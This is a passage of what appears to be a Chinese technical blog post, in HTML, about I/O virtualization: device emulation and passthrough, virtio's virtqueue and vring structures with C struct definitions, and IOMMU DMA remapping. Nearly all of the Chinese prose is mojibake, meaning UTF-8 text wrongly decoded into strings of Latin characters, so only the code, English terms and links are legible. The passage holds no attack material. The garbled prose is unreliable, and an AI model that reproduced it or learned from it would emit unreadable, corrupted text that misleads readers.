æä¾›è™šæ‹Ÿ&#x2F;ç›´é€šè®¾å¤‡çš„æ¥å£</li><li>å®ç°è®¾å¤‡åŠŸèƒ½ï¼šHypervisor éœ€è¦å®ç°è™šæ‹Ÿè®¾å¤‡çš„åŠŸèƒ½</li></ul><h2 id="ä¸€ã€I-x2F-O-è™šæ‹ŸåŒ–åŸºæœ¬æ¨¡å‹"><a href="#ä¸€ã€I-x2F-O-è™šæ‹ŸåŒ–åŸºæœ¬æ¨¡å‹" class="headerlink" title="ä¸€ã€I&#x2F;O è™šæ‹ŸåŒ–åŸºæœ¬æ¨¡å‹"></a>ä¸€ã€I&#x2F;O è™šæ‹ŸåŒ–åŸºæœ¬æ¨¡å‹</h2><blockquote><p>è¿™ä¸€èŠ‚å…¶å®æ˜¯ç¬”è€…ä¸è®°å¾—ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™å‡ºäºä»€ä¹ˆç›®çš„ä»<a href="https://developer.ibm.com/tutorials/l-pci-passthrough/">https://developer.ibm.com/tutorials/l-pci-passthrough/</a>ä¸Šç¿»è¯‘äº†ä¸€æ®µå­˜åœ¨è‰ç¨¿ç®±é‡Œï¼Œæœ€è¿‘ç¿»è‰ç¨¿ç®±å‘ç°ä¹‹å‰å±…ç„¶è¿˜ç•™å­˜æœ‰è¿™ç§ä¸œè¥¿ï¼Œæ‰€ä»¥ä¿®æ”¹ä¸€ä¸‹å°±æ”¾ä¸Šæ¥äº†XD</p></blockquote><h3 id="I-å¹³å°è®¾å¤‡æ¨¡æ‹Ÿï¼ˆPlatform-device-emulationï¼‰"><a href="#I-å¹³å°è®¾å¤‡æ¨¡æ‹Ÿï¼ˆPlatform-device-emulationï¼‰" class="headerlink" title="I.å¹³å°è®¾å¤‡æ¨¡æ‹Ÿï¼ˆPlatform device emulationï¼‰"></a>I.å¹³å°è®¾å¤‡æ¨¡æ‹Ÿï¼ˆPlatform device emulationï¼‰</h3><p>QEMU å’Œ VMWare éƒ½é€‰æ‹©äº†ä»¿çœŸå‡ºä¸€ä¸ªè™šæ‹Ÿè®¾å¤‡ï¼Œä¸åŒåœ¨äºå…¶æ¨¡æ‹Ÿè®¾å¤‡çš„å®ç°æ–¹å¼ã€‚</p><h4 id="åŸºäºè™šæ‹Ÿæœºç®¡ç†ç¨‹åºçš„è®¾å¤‡æ¨¡æ‹Ÿï¼ˆHypervisor-based-device-emulationï¼‰"><a href="#åŸºäºè™šæ‹Ÿæœºç®¡ç†ç¨‹åºçš„è®¾å¤‡æ¨¡æ‹Ÿï¼ˆHypervisor-based-device-emulationï¼‰" class="headerlink" title="åŸºäºè™šæ‹Ÿæœºç®¡ç†ç¨‹åºçš„è®¾å¤‡æ¨¡æ‹Ÿï¼ˆHypervisor-based device emulationï¼‰"></a>åŸºäºè™šæ‹Ÿæœºç®¡ç†ç¨‹åºçš„è®¾å¤‡æ¨¡æ‹Ÿï¼ˆHypervisor-based device emulationï¼‰</h4><p>åœ¨ hypervisor ï¼ˆè™šæ‹Ÿæœºç®¡ç†ç¨‹åºï¼‰ä¸­å¯¹è®¾å¤‡è¿›è¡Œä»¿çœŸæ˜¯ VMware workstation ç³»åˆ—äº§å“è¾ƒä¸ºå¸¸ç”¨çš„ä¸€ç§æ–¹å¼ï¼šåœ¨ hypervisor ä¸­æœ‰ç€å¯¹ä¸€èˆ¬è®¾å¤‡çš„ä»¿çœŸä¾› guest OS è¿›è¡Œå…±äº«ï¼ŒåŒ…æ‹¬è™šæ‹Ÿç£ç›˜ã€è™šæ‹Ÿç½‘ç»œé€‚é…å™¨ä¸å…¶ä»–çš„å¿…è¦å…ƒç´ ï¼Œè¿™ç§æ¨¡å‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/02/25/IQduvSe7wE4TLgq.png" alt="image.png"></p><h4 id="åœ¨ç”¨æˆ·ç©ºé—´è¿›è¡Œè®¾å¤‡æ¨¡æ‹Ÿï¼ˆUser-space-device-emulationï¼‰"><a href="#åœ¨ç”¨æˆ·ç©ºé—´è¿›è¡Œè®¾å¤‡æ¨¡æ‹Ÿï¼ˆUser-space-device-emulationï¼‰" class="headerlink" title="åœ¨ç”¨æˆ·ç©ºé—´è¿›è¡Œè®¾å¤‡æ¨¡æ‹Ÿï¼ˆUser space device emulationï¼‰"></a>åœ¨ç”¨æˆ·ç©ºé—´è¿›è¡Œè®¾å¤‡æ¨¡æ‹Ÿï¼ˆUser space device emulationï¼‰</h4><p>ç¬¬äºŒç§æ¶æ„ç§°ä¸ºç”¨æˆ·ç©ºé—´è®¾å¤‡æ¨¡æ‹Ÿï¼Œæ­£å¦‚å…¶åï¼Œç›¸æ¯”äºåœ¨ hypervisor ä¸­è¿›è¡Œæ¨¡æ‹Ÿï¼Œå…¶é€‰æ‹©äº†åœ¨ç”¨æˆ·ç©ºé—´è¿›è¡Œæ¨¡æ‹Ÿçš„æ–¹å¼ã€‚QEMUï¼ˆä¸ä»…æä¾›äº†è®¾å¤‡æ¨¡æ‹ŸåŒæ—¶è¿˜æœ‰ä¸€ä¸ª hypervisorï¼‰åœ¨ç”¨æˆ·ç©ºé—´ä¸­ç‹¬ç«‹æ¨¡æ‹Ÿäº†ä¸€ä¸ªè®¾å¤‡ï¼Œè¯¥æ¨¡æ‹Ÿè®¾å¤‡è¢«å…¶ä»–çš„ VM é€šè¿‡ hypervisor æä¾›çš„æ¥å£è¿›è¡Œè°ƒç”¨ã€‚ç”±äºè®¾å¤‡çš„æ¨¡æ‹Ÿæ˜¯ç‹¬ç«‹äº hypervisor çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ¨¡æ‹Ÿä»»ä½•è®¾å¤‡ï¼Œä¸”è¯¥æ¨¡æ‹Ÿè®¾å¤‡å¯ä»¥åœ¨å…¶ä»– hypervisor é—´è¿›è¡Œå…±äº«ã€‚</p><p><img src="https://s2.loli.net/2022/02/28/IQbMNCcDlXR4z5V.png" alt="image.png"></p><h3 id="II-è®¾å¤‡ç›´é€šï¼ˆDevice-passthroughï¼‰"><a href="#II-è®¾å¤‡ç›´é€šï¼ˆDevice-passthroughï¼‰" class="headerlink" title="II.è®¾å¤‡ç›´é€šï¼ˆDevice passthroughï¼‰"></a>II.è®¾å¤‡ç›´é€šï¼ˆDevice passthroughï¼‰</h3><p>ä¸Šé¢çš„è¿™ä¸¤ç§æ¨¡å‹æˆ–å¤šæˆ–å°‘éƒ½å­˜åœ¨ç€ä¸€å®šçš„æ€§èƒ½å¼€é”€ï¼Œå¦‚æœè¯¥è®¾å¤‡éœ€è¦è¢«å¤šä¸ª VM å…±äº«ï¼Œé‚£è¿™ç§å¼€é”€æˆ–è®¸æ˜¯å€¼å¾—çš„ï¼Œä½†å¦‚æœè¯¥è®¾å¤‡å¹¶ä¸éœ€è¦å…±äº«ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…¶å®å¯ä»¥ä½¿ç”¨ä¸€ç§æ›´ä¸ºé«˜æ•ˆçš„æ–¹æ³•â€”â€”è®¾å¤‡ç›´é€šï¼ˆDevice passthroughï¼‰ã€‚</p><h4 id="é€šè¿‡è™šæ‹Ÿæœºç®¡ç†ç¨‹åºè¿›è¡Œç›´é€šï¼ˆPassthrough-within-the-hypervisorï¼‰"><a href="#é€šè¿‡è™šæ‹Ÿæœºç®¡ç†ç¨‹åºè¿›è¡Œç›´é€šï¼ˆPassthrough-within-the-hypervisorï¼‰" class="headerlink" title="é€šè¿‡è™šæ‹Ÿæœºç®¡ç†ç¨‹åºè¿›è¡Œç›´é€šï¼ˆPassthrough within the hypervisorï¼‰"></a>é€šè¿‡è™šæ‹Ÿæœºç®¡ç†ç¨‹åºè¿›è¡Œç›´é€šï¼ˆPassthrough within the hypervisorï¼‰</h4><p>è®¾å¤‡ç›´é€šå¯ä»¥ç†è§£ä¸ºè®¾å¤‡ç‹¬å çš„è®¾å¤‡æ¨¡æ‹Ÿï¼šç›´æ¥å°†è®¾å¤‡<strong>éš”ç¦»</strong>ç»™åˆ°æŒ‡å®šçš„ VM ä¸Šï¼Œä»¥ä¾¿è¯¥è®¾å¤‡å¯ä»¥ç”±è¯¥ VM ç‹¬å ä½¿ç”¨ã€‚<strong>è¿™æä¾›äº†æ¥è¿‘äºåŸç”Ÿè®¾å¤‡çš„æ€§èƒ½</strong>ï¼Œä¾‹å¦‚å¯¹äºä¸€äº›éœ€è¦å¤§é‡ IO çš„è®¾å¤‡ï¼ˆä¾‹å¦‚ç½‘ç»œè®¾å¤‡ç­‰ï¼‰ï¼Œä½¿ç”¨è®¾å¤‡ç›´é€šèƒ½æä¾›ç›¸å½“å®Œç¾çš„æ€§èƒ½ã€‚</p><p>ä¸‹å›¾å·¦åŠéƒ¨åˆ†ä¾¿ä¸ºè®¾å¤‡ç›´é€š</p><p><img src="https://s2.loli.net/2022/02/28/PRSNK1g4saEjvVF.png" alt="image.png"></p><h2 id="äºŒã€è½¯ä»¶åŠè™šæ‹ŸåŒ–-virtio"><a href="#äºŒã€è½¯ä»¶åŠè™šæ‹ŸåŒ–-virtio" class="headerlink" title="äºŒã€è½¯ä»¶åŠè™šæ‹ŸåŒ– - virtio"></a>äºŒã€è½¯ä»¶åŠè™šæ‹ŸåŒ– - virtio</h2><p><code>virtio</code> è¿™ä¸ªæ¦‚å¿µæ¥è‡ªäºä¸€ç¯‡éå¸¸å¤è€çš„è™šæ‹ŸåŒ–é¢†åŸŸçš„è®ºæ–‡ï¼š<a href="https://ozlabs.org/~rusty/virtio-spec/virtio-paper.pdf">virtio: towards a de-facto standard for virtual I&#x2F;O devices</a>ï¼Œä¸»è¦æ˜¯ä¸ºäº†è§£å†³è®¾å¤‡è™šæ‹ŸåŒ–çš„é—®é¢˜è€Œ<strong>æä¾›äº†ä¸€å¥—é€šç”¨çš„è™šæ‹ŸåŒ–è®¾å¤‡æ¨¡å‹</strong>ï¼ŒGuest OS åªéœ€è¦å®ç°ä¸€å¥—ç»Ÿä¸€çš„ virtio é©±åŠ¨ä¾¿èƒ½ä»¥ç»Ÿä¸€çš„æ–¹å¼è®¿é—®è™šæ‹ŸåŒ–è®¾å¤‡ï¼Œä»è€Œé¿å…äº†å„ç§è™šæ‹ŸåŒ–é©±åŠ¨åˆ†è£‚çš„é—®é¢˜</p><p><img src="https://s2.loli.net/2022/08/29/SZ2p17EtqRHoFQh.png" alt="image.png"></p><h3 id="I-VirtQueueï¼šä¼ è¾“å±‚æŠ½è±¡"><a href="#I-VirtQueueï¼šä¼ è¾“å±‚æŠ½è±¡" class="headerlink" title="I. VirtQueueï¼šä¼ è¾“å±‚æŠ½è±¡"></a>I. VirtQueueï¼šä¼ è¾“å±‚æŠ½è±¡</h3><p><code>virtqueue</code> ä¸º virtio ä¸­ç”¨ä»¥è¿›è¡Œæ•°æ®ä¼ è¾“çš„å…³é”®ç»“æ„ï¼Œå…¶æœ¬èº«è¡¨ç¤ºä¸€ä¸ª<strong>æ•°æ®é˜Ÿåˆ—</strong>ï¼šç”±ä¸€æ–¹å‘é˜Ÿåˆ—ä¸­æ·»åŠ  bufferï¼Œå¦ä¸€æ–¹ä»é˜Ÿåˆ—ä¸­å–å‡º bufferâ€”â€”é€šè¿‡è¿™æ ·çš„æ–¹å¼å®ç°äº† Guest ä¸ Host ä¹‹é—´åŸºæœ¬çš„æ•°æ®ä¼ è¾“æ¨¡å‹</p><p>ä¸ºäº†å‡å°‘æ¨¡å‹çš„å¤æ‚æ€§ï¼Œé€šå¸¸æˆ‘ä»¬ä½¿ç”¨ virtqueue çš„ä¼ è¾“éƒ½æ˜¯å•å‘çš„ï¼Œå› æ­¤ä¸€ä¸ªæœ€ç®€å•çš„æ¨¡å‹å°±æ˜¯æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ä¸¤ä¸ª virtqueue æ¥å®ç° Guest ä¸ Host ä¹‹é—´çš„åŒå‘é€šä¿¡ï¼štx queueï¼ˆå‘é€é˜Ÿåˆ—ï¼‰ &amp; rx queueï¼ˆæ¥æ”¶é˜Ÿåˆ—ï¼‰</p><p><img src="https://s2.loli.net/2022/08/29/g1kn2r4VWO7GBLM.png" alt="è½¬è‡ª LoyenWang å…¬ä¼—å·çš„å›¾ç‰‡ï¼Œéå¸¸æ¸…æ™°çš„è¡¨ç¤ºäº† virtqueue å·¥ä½œåŸç†çš„ä¸€å¼ å›¾ï¼"></p><p>å¯¹äº virtqueue çš„æ“ä½œï¼Œåœ¨è®ºæ–‡ä¸­æŠ½è±¡æˆä¸€ä¸ªå‡½æ•°è¡¨ <code>virtqueue_ops</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtqueue_ops</span> &#123;</span><br>    <span class="hljs-type">int</span> (*add_buf)(<span class="hljs-keyword">struct</span> virtqueue *vq,<br>                    <span class="hljs-keyword">struct</span> scatterlist sg[],<br>                    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> out_num,<br>                    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> in_num,<br>                    <span class="hljs-type">void</span> *data);<br>    <span class="hljs-type">void</span> (*kick)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>    <span class="hljs-type">void</span> *(*get_buf)(<span class="hljs-keyword">struct</span> virtqueue *vq,<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *len);<br>    <span class="hljs-type">void</span> (*disable_cb)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>    <span class="hljs-type">bool</span> (*enable_cb)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>add_buf</code>ï¼šå‘ virtqueue ä¸­æ·»åŠ ä¸€ä¸ª buffer</li><li><code>kick</code> ï¼šé€šçŸ¥å¦ä¸€æ–¹æ–°åˆ°è¾¾äº†ä¸€ä¸ª buffer</li><li><code>get_buf</code> ä» virtqueue ä¸­è·å–ä¸€ä¸ª buffer</li><li><code>disable_cb</code>ï¼šé€šçŸ¥å¦ä¸€æ–¹å…³é—­ buffer åˆ°è¾¾çš„æç¤º</li><li><code>enable_cb</code>ï¼šé€šçŸ¥å¦ä¸€æ–¹å¼€å¯ buffer åˆ°è¾¾çš„æç¤º</li></ul><h3 id="II-VRingï¼švirtqueue-çš„åŸºæœ¬ç»“æ„"><a href="#II-VRingï¼švirtqueue-çš„åŸºæœ¬ç»“æ„" class="headerlink" title="II. VRingï¼švirtqueue çš„åŸºæœ¬ç»“æ„"></a>II. VRingï¼švirtqueue çš„åŸºæœ¬ç»“æ„</h3><p>virtqueue æ ¸å¿ƒçš„æ•°æ®ç»“æ„ä¾¿æ˜¯ <code>vring</code>ï¼Œè¿™æ˜¯ä¸€ä¸ª<strong>ç¯å½¢ç¼“å†²åŒºé˜Ÿåˆ—</strong>ï¼Œå…¶ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š</p><ul><li>æè¿°ç¬¦è¡¨ï¼ˆDescï¼‰</li><li>å¯ç”¨æè¿°ç¬¦æ•°ç»„ï¼ˆUsedï¼‰</li><li>å·²ç”¨æè¿°ç¬¦æ•°ç»„ï¼ˆAvailï¼‰</li></ul><p><img src="https://s2.loli.net/2022/08/29/OrlAvYaFkZ3dIXt.png" alt="image.png"></p><p>ä¸€ä¸ªæè¿°ç¬¦ï¼ˆDescriptorï¼‰ä¸ºå¦‚ä¸‹ç»“æ„ï¼Œè¡¨ç¤ºäº†ä¸€å— buffer çš„åŸºæœ¬å±æ€§ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸€ä¸ª Avail&#x2F;Used è¡¨é¡¹é€šå¸¸æ˜¯å¤šä¸ª descriptor ä¸²è”çš„ bufferâ€”â€”è¿™ä¾¿æ˜¯ next åŸŸçš„ä½œç”¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_desc</span></span><br><span class="hljs-class">&#123;</span><br>    __u64 addr;<span class="hljs-comment">// Guest Physical Addresses</span><br>    __u32 len;<span class="hljs-comment">// é•¿åº¦</span><br>    __u16 flags;<span class="hljs-comment">// å±æ€§</span><br>    __u16 next;<span class="hljs-comment">// ä¸‹ä¸€ä¸ªæè¿°ç¬¦çš„ idx</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>Avail</strong> æ•°ç»„ç”¨æ¥å­˜å‚¨å½“å‰å¯ç”¨çš„æè¿°ç¬¦ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_avail</span></span><br><span class="hljs-class">&#123;</span><br>    __u16 flags;<br>    __u16 idx;<br>    __u16 ring[NUM];<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>Used</strong> æ•°ç»„åˆ™ç”¨æ¥å­˜å‚¨å·²ç»è¢«ä½¿ç”¨çš„æè¿°ç¬¦ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_used_elem</span></span><br><span class="hljs-class">&#123;</span><br>    __u32 id;<br>    __u32 len;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_used</span></span><br><span class="hljs-class">&#123;</span><br>    __u16 flags;<br>    __u16 idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_used_elem</span> <span class="hljs-title">ring</span>[];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>Avail æ•°ç»„ä¸ Used æ•°ç»„åŒæ ·æ˜¯ä¸€ä¸ª<strong>ç¯å½¢é˜Ÿåˆ—</strong>ï¼Œä¸è¿‡è¿™ä¸¤ä¸ªæ•°ç»„åˆ†åˆ«ç”±é€šä¿¡çš„ä¸¤æ–¹è¿›è¡Œä½¿ç”¨ï¼š</p><ul><li>æ•°æ®<strong>å‘é€æ–¹</strong>å‡†å¤‡å¥½æ•°æ®åä» <code>Avail é˜Ÿåˆ—</code> ä¸­è·å–å¯ç”¨çš„è¡¨é¡¹ï¼Œæ›´æ–°æè¿°ç¬¦è¡¨ï¼Œå¹¶åœ¨ <code>Used é˜Ÿåˆ—</code> ä¸­æ’å…¥æ–°çš„è¡¨é¡¹ï¼Œé€šçŸ¥æ¥æ”¶æ–¹æœ‰æ•°æ®åˆ°è¾¾</li><li>æ•°æ®<strong>æ¥æ”¶æ–¹</strong>ä» <code>Used é˜Ÿåˆ—</code> ä¸­å–å‡ºè¡¨é¡¹ï¼Œè¯»å–æè¿°ç¬¦è¡¨ä»¥è·å–æ•°æ®ï¼Œå®Œæˆå¤„ç†åå°†è¡¨é¡¹æ’å…¥åˆ° <code>Avail é˜Ÿåˆ—</code> ä¸­</li></ul><p>ä¸‹å›¾ä¸ºç”± Guest å‘ Host å‘é€æ•°æ®çš„ä¸€ä¸ª vring ç¤ºä¾‹ï¼š</p><p><img src="https://s2.loli.net/2022/08/29/8uUq1jacyEYGlXR.png" alt="è½¬è‡ª LoyenWang å…¬ä¼—å·çš„å›¾ç‰‡ï¼Œéå¸¸æ¸…æ™°çš„è¡¨ç¤ºäº† virtqueue å·¥ä½œåŸç†çš„ä¸€å¼ å›¾ï¼"></p><h3 id="III-virtio-é…ç½®æ“ä½œæŠ½è±¡"><a href="#III-virtio-é…ç½®æ“ä½œæŠ½è±¡" class="headerlink" title="III. virtio é…ç½®æ“ä½œæŠ½è±¡"></a>III. virtio é…ç½®æ“ä½œæŠ½è±¡</h3><p>ç»“åˆ virtqueueï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥æŠ½è±¡å‡ºä¸€ä¸ªè™šæ‹Ÿ PCI è®¾å¤‡çš„åŸºæœ¬æ“ä½œï¼š</p><ul><li>è·å– feature bits</li><li>è¯»å†™é…ç½®ç©ºé—´</li><li>è¯»å†™ status bits</li><li>è®¾å¤‡é‡ç½®</li><li>åˆ›å»º&#x2F;é”€æ¯ virtqueue</li></ul><p>æˆ‘ä»¬å°†å…¶æŠ½è±¡æˆä¸€å¼ å‡½æ•°è¡¨ï¼š<code>virtio_config_ops</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_config_ops</span></span><br><span class="hljs-class">&#123;</span><br>        <span class="hljs-type">bool</span> (*feature)(<span class="hljs-keyword">struct</span> virtio_device *vdev, <span class="hljs-type">unsigned</span> bit);<br>        <span class="hljs-type">void</span> (*get)(<span class="hljs-keyword">struct</span> virtio_device *vdev, <span class="hljs-type">unsigned</span> offset,<br>                    <span class="hljs-type">void</span> *buf, <span class="hljs-type">unsigned</span> len);<br>        <span class="hljs-type">void</span> (*<span class="hljs-built_in">set</span>)(<span class="hljs-keyword">struct</span> virtio_device *vdev, <span class="hljs-type">unsigned</span> offset,<br>                    <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">unsigned</span> len);<br>        u8 (*get_status)(<span class="hljs-keyword">struct</span> virtio_device *vdev);<br>        <span class="hljs-type">void</span> (*set_status)(<span class="hljs-keyword">struct</span> virtio_device *vdev, u8 status);<br>        <span class="hljs-type">void</span> (*reset)(<span class="hljs-keyword">struct</span> virtio_device *vdev);<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtqueue</span> *(*<span class="hljs-title">find_vq</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_device</span> *<span class="hljs-title">vdev</span>,</span><br><span class="hljs-class">                                     <span class="hljs-title">unsigned</span> <span class="hljs-title">index</span>,</span><br><span class="hljs-class">                                     <span class="hljs-title">void</span> (*<span class="hljs-title">callback</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">virtqueue</span> *));</span><br>        <span class="hljs-type">void</span> (*del_vq)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>feature</code>ï¼šè·å–è®¾å¤‡å¯¹åº”çš„ feature bit</li><li><code>get &amp; set</code> ï¼šè¯»å†™è®¾å¤‡çš„é…ç½®ç©ºé—´</li><li><code>get_status &amp; set_status</code>ï¼šè¯»å†™è®¾å¤‡çš„ status bits</li><li><code>reset</code>ï¼šé‡ç½®è®¾å¤‡</li><li><code>find_vq</code>ï¼šè·å–&#x2F;åˆ›å»º virtqueue</li><li><code>del_vq</code>ï¼šé”€æ¯ virtqueue</li></ul><h2 id="ä¸‰ã€IOMMU"><a href="#ä¸‰ã€IOMMU" class="headerlink" title="ä¸‰ã€IOMMU"></a>ä¸‰ã€IOMMU</h2><blockquote><p>å¯ä»¥ç›´æ¥å‚è§ <a href="https://www.intel.com/content/dam/develop/external/us/en/documents/intel-whitepaper-using-iommu-for-dma-protection-in-uefi.pdf">Intel çš„æ‰‹å†Œ</a></p></blockquote><p> IOMMU å³ <strong>Input&#x2F;Output Memory Management Unit</strong>ï¼Œå…¶åŠŸèƒ½ç±»ä¼¼äº CPU ä¸­çš„ MMUï¼Œæ˜¯ä¸€ä¸ª<strong>å‘è®¾å¤‡ä¾§æä¾›åœ°å€ç¿»è¯‘åŠŸèƒ½çš„å•å…ƒ</strong></p><p><img src="https://s2.loli.net/2022/09/03/3GOTl4oAExSdPcL.png" alt="image.png"></p><p>IOMMU é€šå¸¸è¢«é›†æˆäºåŒ—æ¡¥ä¸­ï¼Œå…¶æä¾›é¢å‘è®¾å¤‡ç«¯çš„ä¸¤ä¸ªåŠŸèƒ½ï¼š</p><ul><li><strong>DMA é‡æ˜ å°„</strong>ï¼ˆ <strong>DMA remapping</strong>ï¼‰ï¼šæœ‰ç€ DMA åŠŸèƒ½çš„è®¾å¤‡å¯ä»¥ä½¿ç”¨è™šæ‹Ÿåœ°å€ï¼Œé€šè¿‡ IOMMU è½¬æ¢ä¸ºç‰©ç†åœ°å€è¿›è¡Œç›´æ¥å†…å­˜è®¿é—®</li><li><strong>ä¸­æ–­é‡æ˜ å°„</strong>ï¼ˆ<strong>Interrupt remapping</strong>ï¼‰ï¼šIOMMU ä¼šæ‹¦æˆªè®¾å¤‡äº§ç”Ÿçš„ä¸­æ–­ï¼Œæ ¹æ®ä¸­æ–­é‡æ˜ å°„è¡¨äº§ç”Ÿæ–°çš„ä¸­æ–­è¯·æ±‚å‘é€ç»™ LAPIC</li></ul><p><img src="https://s2.loli.net/2022/09/03/k8mOSalVRWtseMi.png" alt="image.png"></p><h3 id="I-DMA-é‡æ˜ å°„"><a href="#I-DMA-é‡æ˜ å°„" class="headerlink" title="I. DMA é‡æ˜ å°„"></a>I. DMA é‡æ˜ å°„</h3><p>DMA é‡æ˜ å°„å³é¢å‘è®¾å¤‡ä¾§çš„åœ°å€è®¿é—®é‡ç¿»è¯‘ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå·¦ä¾§æ˜¯ CPU å¯¹å†…å­˜çš„è™šæ‹ŸåŒ–ï¼šMMU åˆ©ç”¨è¿›ç¨‹é¡µè¡¨å°†è¿›ç¨‹è¦è®¿é—®çš„è™šæ‹Ÿåœ°å€ç¿»è¯‘ä¸ºç‰©ç†åœ°å€ï¼Œä»è€Œå®ç°åœ¨ä¸¤ä¸ªè¿›ç¨‹ä¸­è®¿é—®åŒä¸€ä¸ªè™šæ‹Ÿåœ°å€å®é™…ä¸Šè®¿é—®åˆ°ä¸åŒçš„ç‰©ç†åœ°å€â€”â€”DMA é‡æ˜ å°„ä¹Ÿæ˜¯ç±»ä¼¼çš„åŸç†ï¼Œå¦‚ä¸‹å›¾å³ä¾§æ‰€ç¤ºï¼Œå½“å¤–è®¾æƒ³è¦è¿›è¡Œ DMA æ—¶ï¼ŒIOMMU ä¼šæ ¹æ®â€œè®¾å¤‡é¡µè¡¨â€è¿›è¡Œåœ°å€ç¿»è¯‘ï¼Œä»è€Œä½¿å¾—ä¸¤ä¸ªè®¾å¤‡å„è‡ªæ„ŸçŸ¥è®¿é—®çš„æ˜¯åŒä¸€ä¸ªåœ°å€ï¼Œä½†å®é™…ä¸Šè®¿é—®åˆ°äº†ä¸åŒçš„ç‰©ç†åœ°å€</p><p><img src="https://s2.loli.net/2022/09/03/B3yxUoClVsArMGp.png" alt="image.png"></p><p>DMA é‡æ˜ å°„æœ‰ç€ä»¥ä¸‹çš„ä¸¤ç§æ–¹å¼ï¼š</p><h4 id="â‘ -Request-without-PASID"><a href="#â‘ -Request-without-PASID" class="headerlink" title="â‘  Request-without-PASID"></a>â‘  Request-without-PASID</h4><p>åœ¨ IOMMU ä¸­ä½¿ç”¨äº†ä¸€ä¸ªâ€œäºŒå±‚é¡µè¡¨ + æ ‡å‡†é¡µè¡¨â€ç»“æ„æ¥å®ç° DMA é‡æ˜ å°„ï¼Œéœ€è¦å ç”¨éƒ¨åˆ†ç‰©ç†å†…å­˜ç©ºé—´ï¼š</p><ul><li><strong>Root Table</strong>ï¼šå­˜æ”¾å„ä¸ª bus çš„ DMA é‡æ˜ å°„è¡¨åœ°å€ï¼Œä¸€ä¸ª entry å¯¹åº”ä¸€ä¸ª bus</li><li><strong>Context Table</strong>ï¼šå­˜æ”¾å„ä¸ª domain çš„ DMA é‡æ˜ å°„è¡¨åœ°å€ï¼Œä¸€ä¸ª entry å¯¹åº”ä¸€ä¸ª domain</li><li><strong>Address Translation Structure</strong>ï¼šå®é™…çš„ DMA é‡æ˜ å°„é¡µè¡¨</li></ul><p>åœ¨ IOMMU ä¸­çš„å¯„å­˜å™¨ <strong>Root Table Address Register</strong> ç”¨ä»¥å­˜æ”¾æŒ‡å‘ Root-table çš„æŒ‡é’ˆ</p><p><img src="https://s2.loli.net/2022/09/03/TdAB3Um4xhzHKXZ.png" alt="image.png"></p><p>DMA é‡æ˜ å°„è¿˜éœ€è¦ä¸€ä¸ª id æ¥å”¯ä¸€æ ‡è¯†ä¸€ä¸ªè®¾å¤‡ï¼Œå¯¹äº PCI è®¾å¤‡è€Œè¨€ä¾¿æ˜¯å…¶ BDFï¼ˆBus&#x2F;Device&#x2F;Functionï¼‰ï¼Œå› æ­¤å®é™…çš„åœ°å€è®¿é—®è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/09/03/67FPkW2zafeMBpL.png" 